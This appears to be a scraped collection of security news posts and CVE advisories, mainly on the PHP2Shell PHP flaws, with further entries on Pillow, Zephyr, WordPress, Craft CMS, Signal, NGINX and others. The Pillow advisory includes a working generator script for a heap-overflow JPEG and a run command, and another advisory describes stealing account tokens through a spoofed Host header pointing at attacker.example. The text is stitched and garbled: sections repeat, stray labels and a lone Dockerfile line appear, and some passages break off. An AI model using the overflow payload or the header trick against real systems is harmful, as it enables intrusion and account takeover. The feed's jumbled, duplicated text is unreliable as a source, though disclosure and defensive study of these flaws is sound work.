Півчетвертої ночі закінчили термінові правки на нашому сервері. Причина в тому, що в світі знайшли дві критичні вразливості в самій мові PHP. Їх назвали PHP2Shell, це CVE-2026-109618 і CVE-2026-109619. Оцінка 9.2 з 10, а для експлуатації не потрібна авторизація.

Основна наша система написана іншою мовою, але кілька окремих сервісів працювали на PHP. Ми несемо відповідальність за все, що крутиться на нашому сервері, тому закрили всі.

Що відомо станом на зараз.

Виправлення вийшли 21 жовтня у версіях 8.5.12, 8.4.27, 8.3.36 та 8.2.35. Старші гілки офіційних патчів не отримали.

Знайшли діри дослідники з допомогою моделей ШІ: першу версію компанія Calif ще в серпні, а Wiz незалежно виявила обидві. Дослідники кажуть, що вада існувала роками, але ШІ зробив її експлуатацію практичною.

Інформація витекла за день до виходу патчу. Спроби атак фіксували ще 17 жовтня, за кілька днів до публічного розкриття. Деякі уряди, за повідомленнями, на час відключили свої сайти.

Масштаб. PHP стоїть на близько 70% сайтів, де відома серверна мова. Це не означає, що стільки зламано: надійних цифр підтверджених зломів поки немає, і дослідники пишуть, що експлуатація складніша, ніж здавалось у перший день. Але ризик реальний, а старих версій без підтримки в мережі дуже багато.

Що зробити вам.

Перевірте, чи є PHP на сервері та в контейнерах: php -v, docker images.
Оновіть PHP і перезапустіть php-fpm або веб-сервер.
Якщо оновитись не можете одразу, вимкніть session.upload_progress.enabled.
Подивіться на дивні дочірні процеси від користувача веб-сервера і нові php файли.
Якщо сервіси були відкриті в мережі з 17 жовтня, змініть ключі та токени.

Бережіть себе і свої сервери 🙏

posts.content:
----------------

🛠️ Tool
===================

php2shell-scanner: high-fidelity exposure detection for CVE-2026-109618 and CVE-2026-109619

Searchlight Cyber's research team (the group formerly known as Assetnote) released an open-source scanner for the php2shell vulnerability pair. The team has been through this cycle before, both with wp2shell, which it discovered itself, and with react2shell late last year. Each of these high-impact web-stack issues raises the same detection problem: maximize coverage while minimizing false positives and false negatives. This release is their answer for the current one.

Why another scanner

Scanners published in the wake of the disclosure mostly rely on version checks, or fail to represent the vulnerable conditions accurately for both mod_php and php-fpm. Version-only signals fail in two directions: flagging hosts that are actually patched, or missing hosts where the banner does not reflect exploitable conditions. The logic was first implemented inside the Searchlight Exposure platform, and the standalone version is now public.

How the check works

Detection is progressive, in three tiers:

1. Controlled OOM trigger. The scanner attempts to produce a PHP memory-exhaustion error. The vulnerability fundamentally requires an out-of-memory condition, so there is no reliable way to confirm exploitability without inducing it.
2. Differential empty HTTP 500. Next, it observes responses for a differential empty HTTP 500, which the authors describe as a PHP-FPM worker failure.
3. Version fallback. Only when behavioral checks do not settle the question does it fall back to whether the target advertises a known unpatched PHP version.

Risk profile

The authors are direct about this: triggering an OOM condition is inherently risky, and that is the price of reliable detection here. In the majority of PHP installations a worker crash recovers quickly and should not cause disruption, but the writeup explicitly asks for care and caution when scanning. Practical translation: don't fire this at capacity-constrained production systems during peak traffic.

Context around the disclosure

Initial information on the vulnerability was incomplete, followed quickly by a wave of auto-generated, low-quality PoCs that added noise rather than clarity. Searchlight credits Calif's writeup with settling most of the open questions. The detection logic served Searchlight Exposure customers first, then was released publicly so anyone can determine exposure with the same rigor.

Practical notes
• Exposure validation across mixed PHP estates where mod_php and php-fpm behave differently
• Prioritization: behavioral tiers are stronger evidence than version matches
• Scheduling: run behavioral checks away from peak load, and treat the version fallback tier as weaker evidence by design
• The tool is newly released and not personally tested; this summary reflects the vendor writeup, not an independent accuracy assessment

References
• Repository: assetnote/php2shell-scanner on GitHub
• Authors: Shubham Shah, Adam Kues, Patrik Grobshäuser, Kevin Gervot
• Related: Calif's writeup on php2shell

原發文者承認，自己曾在 Hacker News 提前提及 PHP 即將修補的兩項可造成遠端程式碼執行（RCE, Remote Code Execution）的弱點，編號為 CVE（Common Vulnerabilities and Exposures，公開資安弱點編號）-2026-109618 與 CVE-2026-109619。他原本只是想提醒同樣自行編譯 PHP 的人儘快留意更新，卻意外干擾協調式弱點揭露（coordinated disclosure，讓修補與公開時程配合的做法），使既定公開時程調整，也增加許多人的應變負擔，因此公開致歉並表示願意承擔責任。

posts.content:
Півчетвертої ночі закінчили термінові правки на нашому сервері. Причина в тому, що в світі знайшли дві критичні вразливості в самій мові PHP. Їх назвали PHP2Shell, це CVE-2026-109618 і CVE-2026-109619. Оцінка 9.2 з 10, а для експлуатації не потрібна авторизація.

Основна наша система написана іншою мовою, але кілька окремих сервісів працювали на PHP. Ми несемо відповідальність за все, що крутиться на нашому сервері, тому закрили всі.

Що відомо станом на зараз.

Виправлення вийшли 21 жовтня у версіях 8.5.12, 8.4.27, 8.3.36 та 8.2.35. Старші гілки офіційних патчів не отримали.

Знайшли діри дослідники з допомогою моделей ШІ: першу версію компанія Calif ще в серпні, а Wiz незалежно виявила обидві. Дослідники кажуть, що вада існувала роками, але ШІ зробив її експлуатацію практичною.

Інформація витекла за день до виходу патчу. Спроби атак фіксували ще 17 жовтня, за кілька днів до публічного розкриття. Деякі уряди, за повідомленнями, на час відключили свої сайти.

Масштаб. PHP стоїть на близько 70% сайтів, де відома серверна мова. Це не означає, що стільки зламано: надійних цифр підтверджених зломів поки немає, і дослідники пишуть, що експлуатація складніша, ніж здавалось у перший день. Але ризик реальний, а старих версій без підтримки в мережі дуже багато.

Що зробити вам.

Перевірте, чи є PHP на сервері та в контейнерах: php -v, docker images.
Оновіть PHP і перезапустіть php-fpm або веб-сервер.
Якщо оновитись не можете одразу, вимкніть session.upload_progress.enabled.
Подивіться на дивні дочірні процеси від користувача веб-сервера і нові php файли.
Якщо сервіси були відкриті в мережі з 17 жовтня, змініть ключі та токени.

Бережіть себе і свої сервери 🙏

PHP Group Discloses New Unpatched Remote Code Execution Flaw Following PHP2Shell Updates

The PHP Group disclosed a new unpatched remote code execution vulnerability (CVE-2026-115560) affecting session handlers, following emergency patches for two critical PHP2Shell flaws (CVE-2026-109618 and CVE-2026-109619).

**If you run PHP, first make sure you’ve applied the emergency PHP2Shell patches from two days ago, then turn off session upload progress (session.upload_progress.enabled = Off) unless you actually need it, which blocks this new flaw. posts.content:
----------------

🛠️ Tool
===================

php2shell-scanner: high-fidelity exposure detection for CVE-2026-109618 and CVE-2026-109619

Searchlight Cyber's research team (the group formerly known as Assetnote) released an open-source scanner for the php2shell vulnerability pair. The team has been through this cycle before, both with wp2shell, which it discovered itself, and with react2shell late last year. Each of these high-impact web-stack issues raises the same detection problem: maximize coverage while minimizing false positives and false negatives. This release is their answer for the current one.

Why another scanner

Scanners published in the wake of the disclosure mostly rely on version checks, or fail to represent the vulnerable conditions accurately for both mod_php and php-fpm. Version-only signals fail in two directions: flagging hosts that are actually patched, or missing hosts where the banner does not reflect exploitable conditions. The logic was first implemented inside the Searchlight Exposure platform, and the standalone version is now public.

How the check works

Detection is progressive, in three tiers:

1. Controlled OOM trigger. The scanner attempts to produce a PHP memory-exhaustion error. The vulnerability fundamentally requires an out-of-memory condition, so there is no reliable way to confirm exploitability without inducing it.
2. Differential empty HTTP 500. Next, it observes responses for a differential empty HTTP 500, which the authors describe as a PHP-FPM worker failure.
3. Version fallback. Only when behavioral checks do not settle the question does it fall back to whether the target advertises a known unpatched PHP version.

Risk profile

The authors are direct about this: triggering an OOM condition is inherently risky, and that is the price of reliable detection here. In the majority of PHP installations a worker crash recovers quickly and should not cause disruption, but the writeup explicitly asks for care and caution when scanning. Practical translation: don't fire this at capacity-constrained production systems during peak traffic.

Context around the disclosure

Initial information on the vulnerability was incomplete, followed quickly by a wave of auto-generated, low-quality PoCs that added noise rather than clarity. Searchlight credits Calif's writeup with settling most of the open questions. The detection logic served Searchlight Exposure customers first, then was released publicly so anyone can determine exposure with the same rigor.

Practical notes
• Exposure validation across mixed PHP estates where mod_php and php-fpm behave differently
• Prioritization: behavioral tiers are stronger evidence than version matches
• Scheduling: run behavioral checks away from peak load, and treat the version fallback tier as weaker evidence by design
• The tool is newly released and not personally tested; this summary reflects the vendor writeup, not an independent accuracy assessment

References
• Repository: assetnote/php2shell-scanner on GitHub
• Authors: Shubham Shah, Adam Kues, Patrik Grobshäuser, Kevin Gervot
• Related: Calif's writeup on php2shell

CVE-2026-19741.description:
Zephyr's OpenThread integration defined CONFIG_OPENTHREAD_JOINER_PSKD with default "J01NME" in modules/openthread/Kconfig.thread (previously subsys/net/l2/openthread/Kconfig, then subsys/net/l2/openthread/Kconfig.thread). J01NME is the example Joining Device Credential used throughout the public OpenThread and Thread commissioning documentation, including Zephyr's own samples/net/sockets/echo_client/README.rst, so it is not a secret. A firmware image built with CONFIG_OPENTHREAD_JOINER_AUTOSTART=y that never overrode the PSKd therefore shipped with a publicly known joining credential compiled in, with no build-time or run-time warning.

The PSKd is the only value that authenticates Thread commissioning: joiner and commissioner run a DTLS-PSK handshake keyed on it, after which the commissioner supplies the full operational dataset. In ot_configure_instance() (modules/openthread/openthread.c), a device with no stored dataset calls otJoinerStart() with the configured PSKd, and ot_joiner_start_handler() calls otThreadSetEnabled() on success. An unauthenticated attacker within 802.15.4 radio range of an uncommissioned device (factory-fresh, after a factory reset, or after a settings erase) can run any stock Thread commissioner registered with J01NME, complete the handshake, and hand the device an attacker-controlled operational dataset.

The device then joins and enables Thread on the attacker's mesh. The attacker becomes its router, seeing, dropping, injecting and spoofing all of the device's IPv6 traffic and impersonating the peers the application expects, while the device is cut off from the network it was meant to join and stays mis-provisioned until it is reset. Only application-layer security with independently provisioned credentials survives. Exposure is limited to builds that enable joiner autostart and leave the PSKd unset; the option is not enabled by default and no in-tree sample uses the vulnerable combination.

The fix removes the default from CONFIG_OPENTHREAD_JOINER_PSKD and adds a BUILD_ASSERT() in modules/openthread/openthread.c, active only under CONFIG_OPENTHREAD_JOINER_AUTOSTART, that fails the build unless a 6-to-32-character PSKd is configured. Products should provision a per-device PSKd from factory data and call otJoinerStart() from the application rather than relying on a credential compiled identically into every unit.

CVE-2026-112393.description: Pillow is a Python imaging library. From 2.0.0 until 13.0.0, Pillow has a heap buffer overflow and stale-heap disclosure in _tiffWriteProc when saving compressed TIFF data through libtiff to a target without a usable fileno(), such as BytesIO. The callback sizes its allocation from the prior buffer size instead of the current write position, allowing an attacker-controlled out-of-line TIFF tag or retained ICC profile to be copied beyond the allocation after libtiff seeks forward. This overflow can crash the process and may allow code execution. Independently, unwritten alignment gaps in compressed TIFF output larger than 64 KiB can disclose stale heap bytes without a crafted tag. File paths and targets with real file descriptors are unaffected. This issue is fixed in version 13.0.0.

CVE-2026-112403.description:
## Summary

`JpegImageFile.draft()` — which `Image.thumbnail()` calls automatically — requests 1/2, 1/4 or 1/8 scaled JPEG output and shrinks `self._size` and the tile extents to match, so `_setimage()` allocates a single-row decode buffer of `ceil(W/s)` samples. `ImagingJpegDecode()` sets `cinfo.scale_num`/`scale_denom`, calls `jpeg_start_decompress()`, and then reads scanlines into that buffer without ever comparing `cinfo.output_width`, `cinfo.output_height` or `cinfo.out_color_components` against `state->xsize`, `state->ysize` and `state->bits`.

libjpeg-turbo 3.x decodes lossless (SOF3) JPEG, but hardwires lossless streams to no scaling — the requested `scale_denom` is silently discarded. It therefore returns full-width `W`-sample rows into a buffer sized for `ceil(W/s)`. Each `jpeg_read_scanlines()` call writes `(W - ceil(W/s)) x components` bytes past the end of the heap allocation, and the overflowing bytes are the decoded pixel values, which are byte-exact for an 8-bit grayscale lossless image.

The input is a standards-compliant JPEG, so `Image.open(..., formats=["JPEG"])` does not prevent it. Pillow's Python SOF parser already accepts marker `0xFFC3` ("SOF3", "Spatial lossless") at 8-bit precision, so the file opens normally as a `JPEG` / mode `L` image at its full declared size.

## Affected code

At `e41083f383c9cd3db95de52564cc0b6452313d4a` (`main`, 2026-08-29):

- `src/libImaging/JpegDecode.c:224-262` — `ImagingJpegDecode()`; `jpeg_start_decompress()` at :240, `jpeg_read_scanlines()` at :252, with no geometry check between them.
- `src/decode.c:222-231` — `_setimage()`; `state->buffer = calloc(1, state->bytes)` with `state->bytes = (state->bits * state->xsize + 7) / 8`.
- `src/PIL/JpegImagePlugin.py:428-464` — `JpegImageFile.draft()`; computes `s` and shrinks `_size`, the tile extents and `decoderconfig` with no notion of lossless coding.
- `src/PIL/JpegImagePlugin.py:271` — `0xFFC3: ("SOF3", "Spatial lossless", SOF)`.

```c
// src/libImaging/JpegDecode.c
            if (context->scale > 1) {
                context->cinfo.scale_num = 1;
                context->cinfo.scale_denom = context->scale;
            }
            ...
        case 2:
            if (!jpeg_start_decompress(&context->cinfo)) {
                break;
            }
            state->state++;
            /* fall through */
        case 3:
            ok = 1;
            while (state->y < state->ysize) {
                ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);
```

Because `state->ysize` (`ceil(H/s)`) can never equal libjpeg's `output_height` when `s >= 2`, the decode always ends in an error after the rows have already been written: the caller sees an exception and gets no pixels back. The `OSError` is a consequence of the overflow, not the issue being reported.

## Primitive

Per scanline: a contiguous write of `(W - ceil(W/s)) x c` bytes immediately past a `calloc(ceil(W/s) x c)` block, where `c = 1` for mode `L` and 4 for RGB (RGBX) and CMYK; repeated for `ceil(H/s)` rows over the same region. The buffer size class is chosen by the attacker through `W`, and for grayscale the overflowing content is an arbitrary attacker-chosen byte string.

Measured in the reproducer below: 1200x1100 mode `L`, `s=2` — a 600-byte allocation, 600 bytes written past it, ASan reporting the whole 1200-byte row write as one `memcpy`.

Threshold: `draft()` must select `s >= 2`, i.e. `W // requested_w >= 2` and `H // requested_h >= 2`. For `thumbnail((256,256))` with the default `reducing_gap=2.0` that means `W, H >= 1024`.

## Reproduction

Self-contained Docker reproducer (Ubuntu 24.04, clang 20, libjpeg-turbo 3.1.4 and Pillow both built from source with `-fsanitize=address`; Pillow checked out at `${TARGET_COMMIT}`, default `e41083f383c9cd3db95de52564cc0b6452313d4a`). Save the three files below as `Dockerfile`, `make_sof3.py` and `trigger.py` in an empty directory, then:

```bash
docker build -t pillow-sof3-oob . && docker run --rm pillow-sof3-oob
```

`make_sof3.py` is a self-contained encoder that emits a standards-compliant 8-bit grayscale lossless-Huffman JPEG (SOI / DHT / SOF3 `P=8, Y=1100, X=1200, Nf=1` / SOS `Ss=1` predictor 1, `Se=0`, `Ah=Al=0` / entropy-coded row differences / EOI), whose rows carry a repeating marker pattern. `trigger.py` opens it and calls `thumbnail()`, whose implicit `draft()` picks `s=2` and allocates a 600-byte row buffer.

ARG CLANG_VERSION=20

### `make_sof3.py`

```python
#!/usr/bin/env python3
"""Generate an 8-bit grayscale lossless-Huffman (SOF3) JPEG.

Standards-compliant per ITU-T T.81 Annex H (lossless mode), predictor 1 (Ra).
Rows carry an attacker-chosen marker byte pattern verbatim (lossless => exact).
"""
import struct
import sys

W = 1200
H = 1100
MARKER = b"AAAABBBBCCCCDDDD"  # attacker-chosen bytes that land past the buffer


class BitWriter:
    def __init__(self):
        self.out = bytearray()
        self.acc = 0
        self.n = 0

    def put(self, value, nbits):
        for i in range(nbits - 1, -1, -1):
            self.acc = (self.acc << 1) | ((value >> i) & 1)
            self.n += 1
            if self.n == 8:
                self.out.append(self.acc)
                if self.acc == 0xFF:
                    self.out.append(0x00)  # byte stuffing
                self.acc = 0
                self.n = 0

    def flush(self):
        while self.n:
            self.put(1, 1)
        return bytes(self.out)


# Canonical Huffman: 17 symbols (categories 0..16), all of code length 5.
BITS = [0] * 17
BITS[5] = 17
HUFFVAL = list(range(17))
CODES = {sym: (i, 5) for i, sym in enumerate(HUFFVAL)}


def category(d):
    if d == 0:
        return 0
    return abs(d).bit_length()


def build_pixels():
    rows = []
    for y in range(H):
        row = bytearray()
        while len(row) < W:
            row += MARKER
        rows.append(bytes(row[:W]))
    return rows


def main(path):
    rows = build_pixels()
    bw = BitWriter()
    prev = None
    for y in range(H):
        row = rows[y]
        for x in range(W):
            s = row[x]
            if y == 0 and x == 0:
                pred = 1 << 7          # 2^(P-1-Pt)
            elif x == 0:
                pred = prev[0]         # Rb for first sample of a line
            else:
                pred = row[x - 1]      # Ra, predictor 1
            d = (s - pred) & 0xFFFF
            if d >= 0x8000:
                d -= 0x10000
            ssss = category(d)
            code, length = CODES[ssss]
            bw.put(code, length)
            if ssss:
                v = d if d > 0 else d + (1 << ssss) - 1
                bw.put(v & ((1 << ssss) - 1), ssss)
        prev = row
    entropy = bw.flush()

    out = bytearray()
    out += b"\xff\xd8"                                        # SOI
    # DHT: class 0 (DC/lossless), table id 0
    dht = bytes([0x00]) + bytes(BITS[1:17]) + bytes(HUFFVAL)
    out += b"\xff\xc4" + struct.pack(">H", len(dht) + 2) + dht
    # SOF3: lossless, Huffman, sequential
    sof = struct.pack(">BHHB", 8, H, W, 1) + bytes([1, 0x11, 0])
    out += b"\xff\xc3" + struct.pack(">H", len(sof) + 2) + sof
    # SOS: Ns=1, Cs=1, Td=0/Ta=0, Ss=1 (predictor 1), Se=0, Ah=0/Al=0
    sos = bytes([1, 1, 0x00, 1, 0, 0])
    out += b"\xff\xda" + struct.pack(">H", len(sos) + 2) + sos
    out += entropy
    out += b"\xff\xd9"                                        # EOI
    with open(path, "wb") as f:
        f.write(bytes(out))
    print(f"wrote {path}: {len(out)} bytes, {W}x{H} 8-bit grayscale SOF3 lossless")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/sof3_gray_1200x1100.jpg")
```

Negative control, same image: a baseline DCT JPEG of identical dimensions thumbnails cleanly, because libjpeg honours 1/2 scaling exactly as `draft()` computed it.

```

thumbnail OK, size = (256, 235) -- no ASan report
```

## Scope and caveats

- Reproduced on `main` at `e41083f383c9cd3db95de52564cc0b6452313d4a`, which is current `origin/main` as of 2026-08-30. Also reported against 12.3.0.
- Requires the linked libjpeg to support lossless decoding, i.e. libjpeg-turbo >= 3.0. That is what the official Pillow wheels bundle. Builds against libjpeg-turbo 2.x or IJG libjpeg reject SOF3 before any row is decoded and are not affected.
- No non-default Pillow configuration is involved: `Image.thumbnail()` calls `draft()` by default, and the triggering bytes are entirely file data.
- Only paths that use `draft()` before loading are affected. `open().load()` and `resize()` decode at scale 1 and are unaffected. Calling `img.load()` before `thumbnail()`, or `thumbnail(..., reducing_gap=None)`, avoids the path in an application today.
- Not affected on the same code path: SOF11 (arithmetic lossless) fails with `JERR_ARITH_NOTIMPL` before any row; 12- and 16-bit lossless are rejected by Pillow's `SOF()` because it requires `bits == 8`; SOF5-7/13-15 fail with `JERR_SOF_UNSUPPORTED`.

CVE-2026-58202.description: OpenReception's appointment booking software provides an end-to-end encrypted appointment booking platform. Prior to version 2.0.0, the account-confirmation link in emails is built from the request Host header, with no allowlist. The unauthenticated POST /api/auth/resend-confirmation rotates a pending invitee's confirmation token and emails a link whose host comes from the request. An attacker who sends one resend-confirmation with Host: attacker.example and a pending invitee's email causes that invitee to receive a confirmation email whose only link points to the attacker. If the invitee clicks, the one-time confirmation token reaches the attacker, who then confirms the account on the real tenant domain and registers a passkey they control, taking over the account before the legitimate invitee ever uses it. All released versions through v1.1.0 are affected; no patched version exists yet. Reaching the app with a spoofed Host depends on the front proxy: the stock Caddy catch-all forwards it, while an operator who configures explicit per-tenant proxy blocks is not affected (see Details 4). The invite path builds links from the trusted tenant.domain (invite/+server.ts:204-210); the resend-confirmation path builds them from the request Host. This issue has been patched in version 2.0.0.

CVE-2026-115806.description: The Prime Mover – Backup and Migration plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 2.2.1 via deserialization of untrusted input in the migration search-and-replace routine (recursiveUnserializeReplace()). An unauthenticated attacker can store a crafted, base64-encoded serialized object in wp_comments.comment_content through the standard comment-submission endpoint (wp-comments-post.php). When an administrator subsequently performs a routine Prime Mover export or restore, the plugin base64-decodes that stored value and passes it to unserialize() with no allowed_classes restriction. A Property-Oriented Programming (POP) chain is present in the plugin's own bundled Freemius library (FS_Clone_Manager::__set → FS_Option_Manager::set_option → store() → update_option()), so no additional plugin or theme is required — the plugin ships the gadget itself.

CVE-2026-115889.description:
## Summary

In Wasmtime prior to v43, the Cranelift compiler backend bit-packs its SSA value indices in a way that can result in silent overflow in release builds, and result in incorrect value references in the IR resulting in arbitrary miscompilation. A very large Wasm function body, or one that is specially crafted to use many SSA values, can use this to force type-confusion or other arbitrary side-effects and escape the sandbox.

Cranelift was changed in Wasmtime v43 to use a full `u32` index, with checks if that limit is exceeded, and so is no longer susceptible to this bug.

## Impact

A Wasmtime engine with default settings (using the Cranelift backend) on any architecture/platform could experience a sandbox escape from a specially-crafted Wasm module.

## Patches

Wasmtime v36.0.19 has been released which fixes this issue.

CVE-2026-115938.description:
Craft CMS allows any authenticated control panel user to submit an element-search condition whose element selector is evaluated as a sandboxed Twig object template. Craft’s allowed column filter delegates property lookup to Yii ArrayHelper, outside Twig’s SecurityPolicy. Repeated single-segment lookups therefore bypass the sandbox’s empty property/method allowlists.



The vulnerable condition value is ultimately cast to an integer. That does not protect the secret: the template can return author ID 1 when a guessed key character is correct and an impossible ID otherwise. The JSON endpoint returns entries for the first case and an empty array for the second, forming a stable remote character oracle.



After recovering GeneralConfig::securityKey, the same user can compute Craft’s generic HMAC wire format offline. Signed parameters such as redirect are then accepted and passed to unsandboxed View::renderObjectTemplate(), where Twig’s string-callable form can invoke native PHP callables. The regression proof uses the harmless substr() callback and observes abcdef becoming cdef; it does not execute an OS command.

CVE-2026-79979.description:
The arm64 MMU backend invalidates a single virtual address from the TLB with invalidate_tlb_page() in arch/arm64/core/mmu.c, which issued TLBI VAE1{IS} with an operand of virt >> 12. That operand encodes the ASID in bits [63:48], so the invalidation only ever matched ASID 0 (the kernel page tables) and global entries. Memory domains, however, are allocated ASIDs starting at 1 in arch_mem_domain_init(), and every domain-private leaf created by private_map() is mapped with MT_NG, i.e. non-global. A domain's cached translation therefore survived the invalidation.

All callers of invalidate_tlb_page() are demand-paging paths. When the eviction algorithm reclaims a frame, page_frame_prepare_locked() in kernel/mmu.c calls arch_mem_page_out(), which marks the kernel leaf invalid, propagates the invalid descriptor into every domain via sync_domains(), and then flushes only ASID 0. do_page_fault() immediately reuses the very same page frame for the incoming mapping through arch_mem_page_in(). A user thread that had already touched the evicted page — a k_mem_partition added with arch_mem_domain_partition_add(), or its own stack mapped by map_thread_stack() — retains a valid EL0 read/write translation to that physical frame under its own ASID.

Unprivileged code running in a user thread can drive memory pressure to force eviction and then keep accessing the stale address, obtaining read and write access to whatever the kernel subsequently placed in that frame: supervisor data, another memory domain's partition, or another thread's stack. This defeats the isolation that CONFIG_USERSPACE is meant to enforce, allowing information disclosure and memory corruption up to full compromise of the system.

The fix switches the implementation to TLBI VAAE1{IS}, which matches every ASID and both global and non-global entries, so no domain-tagged translation survives a page out, dirty-bit update or access-flag clear. Exploitation requires an arm64 build with both CONFIG_USERSPACE and CONFIG_DEMAND_PAGING enabled, an active backing store, and at least one demand-paged page that is also privately mapped into a user memory domain. The same commit additionally stops globalize_table() from stripping EL0 permission and non-global attributes off domain-private leaves during paging synchronization, which previously caused user threads to lose access to their own partitions and stacks.

CVE-2026-79977.description:
The WireGuard VPN service in subsys/net/lib/wireguard/wg.c updated the peer endpoint from a message it could not authenticate. In handle_transport_data(), when the 32-bit receiver index of an incoming transport-data message matched no session, the code both scheduled a new handshake and copied the datagram's source address into peer->endpoint with memcpy(&peer->endpoint, peer_addr, sizeof(peer->endpoint)). Because the receiver index is unknown, there is no key with which such a message could be verified, so the address written into peer->endpoint is entirely attacker-supplied. Every other endpoint update in the implementation happens only after authentication — after the Noise handshake in handle_handshake_init(), or after AEAD decryption plus the anti-replay check in wg_process_data_message().

The WireGuard listener is registered with net_udp_register() using no remote address or port filter and defaults to UDP port 51820 (CONFIG_WIREGUARD_PORT), and wg_ctrl_recv() resolves the peer by interface rather than by any cryptographic identity. Any host able to send a UDP datagram to that port can therefore reach the defect off-path, with no need to observe legitimate traffic: a 16-byte datagram carrying the transport-data type, zeroed reserved bytes and an arbitrary receiver index is sufficient. The vulnerable branch runs whenever the peer has neither a valid handshake nor a current keypair — the state at boot and after a session expires.

A single spoofed datagram redirects peer->endpoint to an address of the attacker's choosing, and all subsequent handshake initiations, keepalives and encrypted data packets are sent there. The legitimate peer never receives the initiations and so never re-authenticates, and nothing resets the endpoint afterwards, leaving the tunnel persistently unusable on devices whose peer does not initiate handshakes itself. The attacker can also relay the redirected initiations to the real peer to place itself in the path of the tunnel, observing ciphertext and traffic metadata and selectively dropping packets. WireGuard's end-to-end cryptography still prevents decryption or forgery of tunnel content, so the impact is loss of availability plus limited confidentiality, not key compromise.

The fix removes the endpoint learning from this path entirely: the stale-session recovery is kept, but the handshake is sent only to an endpoint learnt from an authenticated message, falling back to the configured cfg_endpoint, and the message is dropped when neither is known. CONFIG_WIREGUARD is marked experimental and is not enabled by default.

CVE-2026-115419.description:
**Summary**  
Strands Agents SDK is an open-source SDK, available for Python (strands-agents) and TypeScript (@strands-agents/sdk), for building and running AI agents. An issue exists where, under certain circumstances, the Agent2Agent (A2A) server shares conversation history across callers with different context\_id values, allowing one caller to read and influence another caller's session.  
  
**Impact**  
The A2A server did not properly isolate conversation state between callers. In multi-tenant deployments, an authenticated remote user could access another caller's conversation history or influence model behavior for other callers (CWE-488: Unintended Disclosure of Data Element to Wrong Session). This affects any deployment where an A2A server is reachable by more than one user or tenant.  
  
**Impacted versions:**  
strands-agents (Python): all versions containing the multiagent.a2a module, < 1.43.0  
@strands-agents/sdk (TypeScript): < 1.5.0  
  
**Patches**  
This issue has been addressed in strands-agents version 1.43.0 and @strands-agents/sdk version 1.5.0. The A2A server now uses an agent factory so conversation state is isolated per A2A context\_id. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.  
  
**Workarounds**  
There is no workaround that fully addresses this issue in affected versions. Until you upgrade, do not expose an A2A server to more than one user or tenant. If multiple callers need access, run a separate A2A server instance for each user or tenant.  
  
**References**  
If you have any questions or comments about this advisory, we ask that you contact AWS Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). 🚨 PHP warns of another unpatched remote code execution risk; CVE-2026-115560

The newly disclosed vulnerability is separate from the two PHP2Shell flaws patched earlier this week and is not fixed by PHP 8.5.12, 8.4.27, 8.3.36 or 8.2.35.
⠀
PHP says exploitation requires an unusual configuration where an application:

• Uses php_binary or php_serialize as its session serializer
• Changes the serializer to php at runtime before session_start()
• Has session upload progress enabled
⠀
PHP considers the risk unlikely and plans to release a fix during its next regular update cycle.

Until then, administrators with affected configurations should set:

session.upload_progress.enabled=0

Applications that do not change the session serializer at runtime are not exposed through this path.

No exploitation has been reported.

Source:
https://www.php.net/

"We suggest you set session.upload_progress.enabled=0 until the next regular bugfix release, to fully protect from an unlikely RCE vector. This setting was already listed as a mitigation in the GHSA-6wmf-4rv5-p3rp advisory for CVE-2026-109619 published on Oct 21st, 2026. If you applied it then, keep it in place and no further action is needed.

The issue can only occur under an unusual combination of configuration and application code. An application must set session.serialize_handler to php_binary or php_serialize in its configuration and then switch it to php at runtime with ini_set() before calling session_start(). Session upload progress must also still be enabled. Applications that never change the serialize handler at runtime can keep the feature enabled. Since this setup is unlikely in practice, we are handling it in the regular release cycle and will publish a full advisory for CVE-2026-115560 with the next release."

Source: https://www.php.net/

CVE-2026-46652.description: The Goobi viewer is a web application that allows digitised material to be displayed in a web browser. From version 24.03 to before version 26.05, ExternalFilesDownloader.getFilename() extracts the destination filename from a server-supplied Content-Disposition response header and passes it directly to Path.resolve() without stripping directory components. This allows for a malicious HTTP server that the viewer fetches from to supply an absolute path or ../ traversal sequences as the filename, writing attacker-controlled content to an arbitrary path writable by the Tomcat process. When targeting the deployed web-application directory, this yields remote code execution as the tomcat OS user. This issue has been patched in version 26.05.

"Signal has resolved a critical-severity vulnerability that could allow a malicious caller to keep audio and video tracks enabled even after the user hung up.

The security defect is tracked as CVE-2026-113380 (CVSS score of 9.3) and impacts RingRTC, the open source library Signal uses for voice and video calls, which is based on WebRTC.

Due to the issue, a remote peer could flood the call’s Finite State Machine (FSM) event queue with junk, and the call would not terminate.

This happened because the hangup was not treated as a kill switch, but as an event added to the FSM event queue; there was no rate limit on peer-originated events; and the hangup event had no priority.

“Flood the queue with junk and the hang-up waits behind attacker noise forever, so the call (microphone, possibly camera) is never torn down,” a GitHub write-up by a researcher reads.

By exploiting the vulnerability, an attacker could keep the audio and video tracks flowing from a target device while the victim believes they ended the call.

The security defect was resolved in RingRTC version 2.72.0, which was released on September 4.

Details on the flaw, however, were published on Tuesday, along with a conceptual proof-of-concept (PoC). NIST added the CVE to the NVD database on Tuesday.

Signal resolved the issue by ensuring that call termination requests do not remain blocked in FSM’s event queue and are detected independently.

Users should update their Signal applications as soon as possible. Otherwise, they should check the call indicator to make sure the call indeed ended."

CVE-2026-97205.description:
NGINX Plus and NGINX Open Source have a vulnerability in the ngx_http_core_module module. When asynchronous file I/O (AIO) is enabled in certain configurations, processing a Server Side Includes (SSI) page containing “include virtual” commands may trigger a Use-After-Free (UAF) in the NGINX worker process. This may cause memory corruption or a worker process crash. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.

Impact:
This vulnerability may allow remote attackers to cause a denial-of-service (DoS) on the NGINX system, corrupt its memory, or possibly trigger code execution. There is no control plane exposure; this is a data plane issue only.




Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.

A public PoC is out for CVE-2026-114509, a Laravel authentication bypass in TokenGuard enabling account takeover. Upgrade to 12.68.0 or 13.29.0.

#Laravel #TokenGuard #CVE2026114509 #AuthBypass #PoC #PHP #WebSecurity #CyberSecurity

https://securityonline.info/laravel-authentication-bypass-cve-2026-114509-poc/?utm_source=mastodon&utm_medium=jetpack_social

